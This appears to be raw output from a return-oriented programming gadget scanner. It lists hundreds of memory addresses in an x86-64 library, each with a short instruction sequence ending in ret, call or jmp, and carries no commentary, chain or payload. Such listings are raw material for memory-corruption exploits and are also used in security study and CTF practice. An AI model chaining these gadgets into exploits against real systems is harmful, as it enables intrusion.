0x00002aaaaabd22b0 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaabd7aa7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; call rbx
0x00002aaaaab809b2 : add dword ptr [rax], eax ; add byte ptr [rax], al ; je 0xaba2a ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaac46d41 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jg 0x171d58 ; neg eax ; ret
0x00002aaaaab800b1 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jg 0xab0c1 ; neg eax ; ret
0x00002aaaaac44c97 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jl 0x16fca8 ; neg eax ; ret
0x00002aaaaab93637 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0xbe604
0x00002aaaaaba2043 : add dword ptr [rax], eax ; add byte ptr [rax], al ; js 0xcd057 ; ret
0x00002aaaaab47b79 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac067e3 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 1 ; ret
0x00002aaaaac07438 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov ebp, eax ; call 0x12e718
0x00002aaaaab5db1e : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov qword ptr [rbx], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1f09e : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov qword ptr [rdi], rsi ; ret
0x00002aaaaac06739 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov qword ptr [rdx], rsi ; mov qword ptr [rdx + 8], rdi ; ret
0x00002aaaaac01d1a : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaabd7c94 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, r12 ; call rbx
0x00002aaaaabd7b60 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, r13 ; call rbx
0x00002aaaaabd7ad8 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, r14 ; call rbx
0x00002aaaaabd7f1e : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbp ; call rbx
0x00002aaaaab41b44 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbx ; call r8
0x00002aaaaab41431 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x00002aaaaabadc27 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdx, r8 ; jmp 0xd8c40
0x00002aaaaab10322 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov word ptr [rsi + 0xe], ax ; xor eax, eax ; ret
0x00002aaaaab29ccb : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab29d9b : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab45b6e : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
0x00002aaaaaba1865 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaab4a105 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab50a63 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe2e71 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00002aaaaab5cb5a : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab1d064 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab4046e : add dword ptr [rax], eax ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab55ed4 : add dword ptr [rax], eax ; add byte ptr [rbp + 0x39], cl ; ret 0x976
0x00002aaaaabb7d8a : add dword ptr [rax], eax ; add byte ptr [rbp - 0x7b], al ; ror byte ptr [rdi], 0x84 ; ret 0xfffd
0x00002aaaaac84bee : add dword ptr [rax], eax ; add byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaaaf52de : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabcc9b6 : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab1a097 : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaab81066 : add dword ptr [rax], eax ; add byte ptr [rbx + 0xa777fff], al ; mov eax, edi ; ret
0x00002aaaaabe3abb : add dword ptr [rax], eax ; add byte ptr [rbx - 0x76b3fe18], al ; ret 0x2b49
0x00002aaaaab48e92 : add dword ptr [rax], eax ; add byte ptr [rbx - 0x7af0fd03], al ; ret 0
0x00002aaaaab41e32 : add dword ptr [rax], eax ; add byte ptr [rbx - 0x7bf0fd1e], al ; ret 1
0x00002aaaaab2a764 : add dword ptr [rax], eax ; add byte ptr [rcx + 0x1b802], cl ; add byte ptr [rax], al ; ret
0x00002aaaaabd3f3d : add dword ptr [rax], eax ; add byte ptr [rcx + 0x800008], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab5c2af : add dword ptr [rax], eax ; add byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rbx ; call rax
0x00002aaaaab5c03f : add dword ptr [rax], eax ; add byte ptr [rcx + rcx*4 - 0x1e], cl ; mov rdi, r15 ; call rax
0x00002aaaaab5be21 : add dword ptr [rax], eax ; add byte ptr [rcx + rcx*4 - 0xa], cl ; call rax
0x00002aaaaab3b558 : add dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret 0x34c
0x00002aaaaaaf7d7c : add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaabc25f3 : add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret 0x4118
0x00002aaaaab3b579 : add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret 0x4504
0x00002aaaaab5a7de : add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret 0xe96e
0x00002aaaaabff00d : add dword ptr [rax], eax ; add byte ptr [rcx - 0x80], al ; stc ; cmp cl, byte ptr [rdi] ; xchg eax, ebp ; ret 0x8041
0x00002aaaaaafb554 : add dword ptr [rax], eax ; add byte ptr [rcx - 0xa], al ; ret
0x00002aaaaabe4751 : add dword ptr [rax], eax ; add byte ptr [rcx - 0xa], al ; ret 0xf10
0x00002aaaaabe50ff : add dword ptr [rax], eax ; add byte ptr [rcx], bh ; ret
0x00002aaaaab96683 : add dword ptr [rax], eax ; add byte ptr [rcx], ch ; ret
0x00002aaaaab4ed28 : add dword ptr [rax], eax ; add byte ptr [rcx], cl ; ret 0x8948
0x00002aaaaac0bed6 : add dword ptr [rax], eax ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x00002aaaaab61c00 : add dword ptr [rax], eax ; add byte ptr [rcx], dh ; ror byte ptr [rax], cl ; leave ; cmove rax, rdx ; ret
0x00002aaaaaaf8dc1 : add dword ptr [rax], eax ; add byte ptr [rcx], dh ; ror byte ptr [rcx + 0x39], cl ; ret 0x2576
0x00002aaaaaba2fd5 : add dword ptr [rax], eax ; add byte ptr [rdi], cl ; mov dh, 0x42 ; add dword ptr [rax - 0x7d], ecx ; ret 0x8401
0x00002aaaaabf7d19 : add dword ptr [rax], eax ; add byte ptr [rdi], cl ; ret 0xf3c3
0x00002aaaaabf7cbe : add dword ptr [rax], eax ; add byte ptr [rdi], cl ; ret 0xfc3
0x00002aaaaabf7cf9 : add dword ptr [rax], eax ; add byte ptr [rdi], cl ; ret 0xff83
0x00002aaaaab7344a : add dword ptr [rax], eax ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00002aaaaac8f26e : add dword ptr [rax], eax ; add byte ptr [rsi], dl ; clc ; call qword ptr [rdx]
0x00002aaaaac832ce : add dword ptr [rax], eax ; add cl, ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaabb09ec : add dword ptr [rax], eax ; add dh, dh ; ret
0x00002aaaaac44d85 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7501
0x00002aaaaac44d92 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7502
0x00002aaaaac44d9f : add dword ptr [rax], eax ; add dh, dh ; ret 0x7504
0x00002aaaaac44d57 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x00002aaaaac44d64 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x00002aaaaac44d71 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7540
0x00002aaaaac02281 : add dword ptr [rax], eax ; add dh, dh ; ret 0xf04
0x00002aaaaab3fd20 : add dword ptr [rax], eax ; add rsp, 0x1000 ; pop rbx ; ret
0x00002aaaaabd41fd : add dword ptr [rax], eax ; add rsp, 0x80 ; ret
0x00002aaaaab2a9c5 : add dword ptr [rax], eax ; add rsp, 0xd8 ; ret
0x00002aaaaac8362e : add dword ptr [rax], eax ; and ah, dh ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac89efe : add dword ptr [rax], eax ; and bl, 0xf6 ; jmp qword ptr [rdi]
0x00002aaaaac82c0e : add dword ptr [rax], eax ; and bl, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaac849be : add dword ptr [rax], eax ; and byte ptr [rbx - 0xb], bl ; jmp qword ptr [rcx]
0x00002aaaaac84e3e : add dword ptr [rax], eax ; and byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac8507e : add dword ptr [rax], eax ; and byte ptr [rdx - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac86e7e : add dword ptr [rax], eax ; and byte ptr [rdx], 0xf6 ; jmp qword ptr [rsi]
0x00002aaaaac811ee : add dword ptr [rax], eax ; and dl, bl ; jmp qword ptr [rcx]
0x00002aaaaac6e8a6 : add dword ptr [rax], eax ; and eax, r15d ; jmp rsp
0x00002aaaaac8705e : add dword ptr [rax], eax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac84bd6 : add dword ptr [rax], eax ; call 0x221af14e
0x00002aaaaac85596 : add dword ptr [rax], eax ; call 0x221afb1c
0x00002aaaaac84116 : add dword ptr [rax], eax ; call 0x241ae64a
0x00002aaaaac8d9d6 : add dword ptr [rax], eax ; call 0xffffffffe81b81c0
0x00002aaaaac87016 : add dword ptr [rax], eax ; clc ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac6ea86 : add dword ptr [rax], eax ; clc ; jmp rsp
0x00002aaaaac84ee6 : add dword ptr [rax], eax ; clc ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8e5a6 : add dword ptr [rax], eax ; clc ; push rdi ; call qword ptr [rdx]
0x00002aaaaac86ec6 : add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaab62a9a : add dword ptr [rax], eax ; cmove rax, rdx ; ret
0x00002aaaaac83396 : add dword ptr [rax], eax ; cmp ah, ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac831a6 : add dword ptr [rax], eax ; cmp bh, ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84c36 : add dword ptr [rax], eax ; cmp byte ptr [rbp - 0xb], ch ; call qword ptr [rax]
0x00002aaaaac88006 : add dword ptr [rax], eax ; cmp byte ptr [rbx - 0xa], cl ; call qword ptr [rax]
0x00002aaaaac84e56 : add dword ptr [rax], eax ; cmp byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac87a7e : add dword ptr [rax], eax ; cmp byte ptr [rdi], 0xf6 ; call qword ptr [rbx]
0x00002aaaaac84d36 : add dword ptr [rax], eax ; cmp byte ptr [rsi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac83d16 : add dword ptr [rax], eax ; cmp byte ptr [rsi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac83836 : add dword ptr [rax], eax ; cmp dh, bh ; hlt ; jmp rdi
0x00002aaaaac82f36 : add dword ptr [rax], eax ; cmp dl, ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81206 : add dword ptr [rax], eax ; cmp dl, bl ; jmp qword ptr [rcx]
0x00002aaaaac86e96 : add dword ptr [rax], eax ; cwde ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac84a36 : add dword ptr [rax], eax ; cwde ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac87d26 : add dword ptr [rax], eax ; fadd dword ptr [rbx - 0xa] ; jmp rdi
0x00002aaaaac84976 : add dword ptr [rax], eax ; fcomp dword ptr [rdx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac81126 : add dword ptr [rax], eax ; fcomp st(1) ; call qword ptr [rbx]
0x00002aaaaac81166 : add dword ptr [rax], eax ; fcomp st(1) ; call qword ptr [rsi]
0x00002aaaaac811a6 : add dword ptr [rax], eax ; fcomp st(1) ; jmp qword ptr [rcx]
0x00002aaaaac82e2e : add dword ptr [rax], eax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac851b6 : add dword ptr [rax], eax ; fdiv dword ptr [rbx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac837a6 : add dword ptr [rax], eax ; fdivr st(5) ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6ecce : add dword ptr [rax], eax ; fprem ; call rsp
0x00002aaaaac83146 : add dword ptr [rax], eax ; fsub st(6) ; hlt ; jmp qword ptr [rbx]
0x00002aaaaac84df6 : add dword ptr [rax], eax ; fsubr dword ptr [rsi - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac6c8de : add dword ptr [rax], eax ; hlt ; int1 ; call rsp
0x00002aaaaac6fdd6 : add dword ptr [rax], eax ; hlt ; ret 0xfffd
0x00002aaaaac6cec6 : add dword ptr [rax], eax ; in al, 0x46 ; jmp rsp
0x00002aaaaac6ca26 : add dword ptr [rax], eax ; in al, 0x74 ; int1 ; jmp rsp
0x00002aaaaac801be : add dword ptr [rax], eax ; in eax, -0xe ; call qword ptr [rsi]
0x00002aaaaac6d016 : add dword ptr [rax], eax ; insd dword ptr [rdi], dx ; call rsp
0x00002aaaaac6fda6 : add dword ptr [rax], eax ; ja 0x19adad ; call rsp
0x00002aaaaac6cb7e : add dword ptr [rax], eax ; je 0x197bca ; call rsp
0x00002aaaaac6da06 : add dword ptr [rax], eax ; je 0x198a06 ; jmp rsp
0x00002aaaaac6e506 : add dword ptr [rax], eax ; je 0x1994f5 ; idiv edi ; hlt ; ret 1
0x00002aaaaac6e77e : add dword ptr [rax], eax ; je 0x199796 ; clc ; jmp rsp
0x00002aaaaab1c056 : add dword ptr [rax], eax ; jne 0x47058 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac85006 : add dword ptr [rax], eax ; jno 0x1b0005 ; jmp qword ptr [rcx]
0x00002aaaaac855f6 : add dword ptr [rax], eax ; jnp 0x1b05f5 ; jmp qword ptr [rcx]
0x00002aaaaac82e5e : add dword ptr [rax], eax ; jo 0x1ade46 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84f2e : add dword ptr [rax], eax ; jo 0x1aff2d ; jmp qword ptr [rcx]
0x00002aaaaac857ae : add dword ptr [rax], eax ; jo 0x1b073c ; cmc ; jmp rax
0x00002aaaaac82fee : add dword ptr [rax], eax ; jrcxz 0x1adfec ; call qword ptr [rsi]
0x00002aaaaac83006 : add dword ptr [rax], eax ; jrcxz 0x1ae004 ; jmp qword ptr [rcx]
0x00002aaaaac81fb6 : add dword ptr [rax], eax ; js 0x1acf52 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82656 : add dword ptr [rax], eax ; js 0x1ad607 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac85186 : add dword ptr [rax], eax ; js 0x1b0202 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85336 : add dword ptr [rax], eax ; js 0x1b03b5 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85626 : add dword ptr [rax], eax ; js 0x1b06aa ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81c0e : add dword ptr [rax], eax ; loopne 0x1acc7d ; stc ; call qword ptr [rax]
0x00002aaaaac81dbe : add dword ptr [rax], eax ; loopne 0x1acd57 ; hlt ; call qword ptr [rcx]
0x00002aaaaac822ae : add dword ptr [rax], eax ; loopne 0x1ad251 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac8472e : add dword ptr [rax], eax ; loopne 0x1af78a ; cmc ; call qword ptr [rdx]
0x00002aaaaac84ece : add dword ptr [rax], eax ; loopne 0x1aff46 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8510e : add dword ptr [rax], eax ; loopne 0x1b0189 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6ce6e : add dword ptr [rax], eax ; mov ah, 0x32 ; jmp rsp
0x00002aaaaac6dcce : add dword ptr [rax], eax ; mov ah, 0xc1 ; idiv bh ; cld ; xchg eax, esi ; add dword ptr [rax], eax ; ret 0xfff6
0x00002aaaaac83d5e : add dword ptr [rax], eax ; mov al, 0x1e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81c4e : add dword ptr [rax], eax ; mov al, 0x66 ; stc ; call qword ptr [rax]
0x00002aaaaac84e9e : add dword ptr [rax], eax ; mov al, 0x6f ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81bee : add dword ptr [rax], eax ; mov al, 0x87 ; hlt ; call qword ptr [rax]
0x00002aaaaac83286 : add dword ptr [rax], eax ; mov al, ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac831f6 : add dword ptr [rax], eax ; mov bh, ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82e76 : add dword ptr [rax], eax ; mov bh, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaac84f76 : add dword ptr [rax], eax ; mov byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaabd0c0d : add dword ptr [rax], eax ; mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac374a1 : add dword ptr [rax], eax ; mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00002aaaaab7323c : add dword ptr [rax], eax ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab73181 : add dword ptr [rax], eax ; mov rcx, r8 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaac6e7ee : add dword ptr [rax], eax ; movsb byte ptr [rdi], byte ptr [rsi] ; adc edi, eax ; call rsp
0x00002aaaaac6cdf6 : add dword ptr [rax], eax ; movsb byte ptr [rdi], byte ptr [rsi] ; and dh, bl ; jmp rsp
0x00002aaaaac6c94e : add dword ptr [rax], eax ; movsb byte ptr [rdi], byte ptr [rsi] ; pop rsp ; int1 ; call rsp
0x00002aaaaac82546 : add dword ptr [rax], eax ; movsq qword ptr [rdi], qword ptr [rsi] ; hlt ; call rax
0x00002aaaaac86d8e : add dword ptr [rax], eax ; nop ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac8222e : add dword ptr [rax], eax ; nop ; cdq ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac8359e : add dword ptr [rax], eax ; nop ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84dae : add dword ptr [rax], eax ; nop ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8266e : add dword ptr [rax], eax ; nop ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac812c6 : add dword ptr [rax], eax ; or bl, bl ; call qword ptr [rdi]
0x00002aaaaac84e26 : add dword ptr [rax], eax ; or byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac882f6 : add dword ptr [rax], eax ; or byte ptr [rdx - 0xa], dl ; call qword ptr [rax]
0x00002aaaaac8be96 : add dword ptr [rax], eax ; or byte ptr [rdx - 9], ch ; jmp rsi
0x00002aaaaac6d656 : add dword ptr [rax], eax ; or dh, dh ; jmp rsp
0x00002aaaaac8a8a6 : add dword ptr [rax], eax ; or dl, ah ; sti ; call rsi
0x00002aaaaac811d6 : add dword ptr [rax], eax ; or dl, bl ; jmp qword ptr [rcx]
0x00002aaaaac87076 : add dword ptr [rax], eax ; pop rax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac84506 : add dword ptr [rax], eax ; pop rax ; cmc ; jmp rax
0x00002aaaaac82e46 : add dword ptr [rax], eax ; pop rax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac853e6 : add dword ptr [rax], eax ; pop rax ; js 0x1b03e5 ; jmp qword ptr [rbx]
0x00002aaaaab732bb : add dword ptr [rax], eax ; pop rbx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaac86e4e : add dword ptr [rax], eax ; push rax ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac8790e : add dword ptr [rax], eax ; push rax ; cmp al, 0xf6 ; call qword ptr [rax]
0x00002aaaaac833ae : add dword ptr [rax], eax ; push rax ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac850ae : add dword ptr [rax], eax ; push rax ; jb 0x1b00ad ; jmp qword ptr [rcx]
0x00002aaaaac84d4e : add dword ptr [rax], eax ; push rax ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac849ee : add dword ptr [rax], eax ; push rax ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81e0e : add dword ptr [rax], eax ; push rax ; xchg eax, ecx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6def6 : add dword ptr [rax], eax ; push rsp ; adc edi, esi ; jmp rsp
0x00002aaaaac6ce1e : add dword ptr [rax], eax ; push rsp ; and al, 0xf3 ; jmp rsp
0x00002aaaaac6d78e : add dword ptr [rax], eax ; push rsp ; and al, 0xf6 ; call rsp
0x00002aaaaac8fd26 : add dword ptr [rax], eax ; push rsp ; clc ; jmp qword ptr [rcx]
0x00002aaaaac6e9e6 : add dword ptr [rax], eax ; push rsp ; clc ; jmp rsp
0x00002aaaaac6ca9e : add dword ptr [rax], eax ; push rsp ; cmpsd dword ptr [rsi], dword ptr [rdi] ; int1 ; jmp rsp
0x00002aaaaac6ddae : add dword ptr [rax], eax ; push rsp ; div esi ; call rsp
0x00002aaaaac6e556 : add dword ptr [rax], eax ; push rsp ; out 0xf7, al ; jmp rsp
0x00002aaaaac8ef1e : add dword ptr [rax], eax ; rcl byte ptr [rdx], 0xf8 ; jmp qword ptr [rbx]
0x00002aaaaac83e4e : add dword ptr [rax], eax ; rcr byte ptr [rdi], 1 ; cmc ; jmp qword ptr [rdx]
0x00002aaaaab5dd02 : add dword ptr [rax], eax ; ret
0x00002aaaaac6dcd6 : add dword ptr [rax], eax ; ret 0xfff6
0x00002aaaaac87ace : add dword ptr [rax], eax ; sar byte ptr [rdi], 0xf6 ; call qword ptr [rax]
0x00002aaaaac8557e : add dword ptr [rax], eax ; sar byte ptr [rdx - 0xb], 1 ; jmp qword ptr [rcx]
0x00002aaaaac83c66 : add dword ptr [rax], eax ; sbb al, 0xf5 ; call qword ptr [rdx]
0x00002aaaaac803d6 : add dword ptr [rax], eax ; sbb al, dh ; call rcx
0x00002aaaaac84c06 : add dword ptr [rax], eax ; sbb byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac83916 : add dword ptr [rax], eax ; sbb byte ptr [rbx], al ; cmc ; call qword ptr [rdi]
0x00002aaaaac87186 : add dword ptr [rax], eax ; sbb byte ptr [rdi], dl ; cld ; jmp qword ptr [rsi]
0x00002aaaaac8124e : add dword ptr [rax], eax ; sbb dl, 0xf3 ; jmp qword ptr [rcx]
0x00002aaaaac86dbe : add dword ptr [rax], eax ; shl byte ptr [rcx], 0xf6 ; jmp qword ptr [rsi]
0x00002aaaaac84f16 : add dword ptr [rax], eax ; sub byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac85156 : add dword ptr [rax], eax ; sub byte ptr [rbx - 0xb], dh ; call qword ptr [rsi]
0x00002aaaaac83dd6 : add dword ptr [rax], eax ; sub byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6e55e : add dword ptr [rax], eax ; test ah, dh ; idiv edi ; cld ; ret
0x00002aaaaac84dc6 : add dword ptr [rax], eax ; test al, 0x6e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85036 : add dword ptr [rax], eax ; test al, 0x71 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8a3d6 : add dword ptr [rax], eax ; test al, 0xf1 ; sti ; call rcx
0x00002aaaaac6d886 : add dword ptr [rax], eax ; test byte ptr [rbp - 0xa], bl ; call rsp
0x00002aaaaac6e366 : add dword ptr [rax], eax ; test byte ptr [rbx - 9], ah ; jmp rsp
0x00002aaaaac6d3d6 : add dword ptr [rax], eax ; test byte ptr [rdx - 0xb], al ; jmp rsp
0x00002aaaaac6d2d6 : add dword ptr [rax], eax ; xchg eax, esp ; adc al, 0xf5 ; call rsp
0x00002aaaaac6d706 : add dword ptr [rax], eax ; xchg eax, esp ; adc al, 0xf6 ; call rsp
0x00002aaaaac6e8de : add dword ptr [rax], eax ; xchg eax, esp ; and al, 0xf8 ; jmp rsp
0x00002aaaaac6d406 : add dword ptr [rax], eax ; xchg eax, esp ; cmc ; jmp rsp
0x00002aaaaac6fb96 : add dword ptr [rax], eax ; xchg eax, esp ; fdivr st(2) ; jmp rsp
0x00002aaaaac6eaae : add dword ptr [rax], eax ; xor al, 0x69 ; clc ; call rsp
0x00002aaaaac6fcc6 : add dword ptr [rax], eax ; xor al, 0x73 ; sti ; call rsp
0x00002aaaaac6c55e : add dword ptr [rax], eax ; xor al, 0x81 ; out dx, eax ; jmp rsp
0x00002aaaaac6d27e : add dword ptr [rax], eax ; xor al, 0x91 ; hlt ; jmp rsp
0x00002aaaaac6c616 : add dword ptr [rax], eax ; xor al, 0x94 ; out dx, eax ; call rsp
0x00002aaaaac6ed06 : add dword ptr [rax], eax ; xor al, 0xdb ; clc ; call rsp
0x00002aaaaac6e4d6 : add dword ptr [rax], eax ; xor al, 0xe3 ; idiv edi ; ret 1
0x00002aaaaac6e526 : add dword ptr [rax], eax ; xor al, 0xe5 ; idiv edi ; push rsp ; ret
0x00002aaaaac6c6c6 : add dword ptr [rax], eax ; xor al, 0xfb ; out dx, eax ; call rsp
0x00002aaaaac855de : add dword ptr [rax], eax ; xor byte ptr [rbx - 0xb], bh ; jmp qword ptr [rcx]
0x00002aaaaab628f1 : add dword ptr [rax], edi ; ret
0x00002aaaaaaf5ccc : add dword ptr [rax], edi ; ret 0xaf72
0x00002aaaaab6def7 : add dword ptr [rbp + 0x19], ecx ; ror byte ptr [rcx - 0x7d], cl ; ret 0x8306
0x00002aaaaab6c0ea : add dword ptr [rbp + 0x38], eax ; ret 0x850f
0x00002aaaaab7edec : add dword ptr [rbp + 0x41], ebx ; pop rsp ; pop r13 ; ret
0x00002aaaaabebfff : add dword ptr [rbp + 0x741189d2], eax ; ret 0x3949
0x00002aaaaab41e8c : add dword ptr [rbp + 0xf48ff70], ecx ; add dword ptr [r8 - 0x7d], ecx ; ret 0x8508
0x00002aaaaab41fdb : add dword ptr [rbp + 0xf48ff78], ecx ; add dword ptr [r8 - 0x7d], ecx ; ret 0x8508
0x00002aaaaab9850b : add dword ptr [rbp + 1], ecx ; ret
0x00002aaaaab41707 : add dword ptr [rbp + rcx*4 + 0x46], eax ; dec dword ptr [rax + 0xf] ; add dword ptr [r8 - 0x7d], ecx ; ret 0x4502
0x00002aaaaab41893 : add dword ptr [rbp + rcx*4 + 0x4f], eax ; dec dword ptr [rax + 0xf] ; add dword ptr [r8 - 0x7d], ecx ; ret 0x4502
0x00002aaaaac0eeb2 : add dword ptr [rbp - 0x14], esi ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax] ; jmp rax
0x00002aaaaab804e5 : add dword ptr [rbp - 0x18], esi ; mov dword ptr [rsi + 4], 0 ; ret
0x00002aaaaab6ae95 : add dword ptr [rbp - 0x20], esi ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1d060 : add dword ptr [rbp - 0x23], esi ; mov eax, 1 ; ret
0x00002aaaaab1233d : add dword ptr [rbp - 0x57f2faf], ecx ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaabea983 : add dword ptr [rbp - 0x61], esi ; mov rax, rdi ; add rsp, 8 ; ret
0x00002aaaaab6a070 : add dword ptr [rbp - 0x77], ecx ; ret 0xc149
0x00002aaaaab215b1 : add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x00002aaaaabb8acb : add dword ptr [rbp - 0x7cb7febd], ecx ; ret
0x00002aaaaabda149 : add dword ptr [rbp - 0xc], esi ; add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaabab719 : add dword ptr [rbp - 0xc], esi ; xor eax, eax ; cmp cl, byte ptr [rsi] ; je 0xd66c0 ; pop rbx ; ret
